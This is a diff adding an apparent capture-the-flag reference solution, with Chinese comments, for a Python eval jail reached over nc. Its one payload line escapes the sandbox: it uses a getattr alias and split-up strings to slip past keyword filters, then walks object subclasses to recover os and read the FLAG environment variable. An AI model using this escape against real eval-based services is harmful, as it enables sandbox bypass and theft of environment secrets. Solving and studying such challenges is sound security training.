@@ -1,0 +1,5 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# G 别名全程调用（绕 Name 调用检查），被禁词全部拼接，
+# _wrap_close 来自 socket 引入的 os，经 sys.modules 挖回 os
+G(G(G(G([x for x in G(G(G((), '__cl'+'ass__'), '__ba'+'se__'), '__sub'+'classes__')() if G(x, '__na'+'me__') == '_wrap_'+'clo'+'se'][0], '__in'+'it__'), '__gl'+'obals__')['s'+'ys'], 'mo'+'dules')['o'+'s'], 'envi'+'ron')['F'+'LAG']
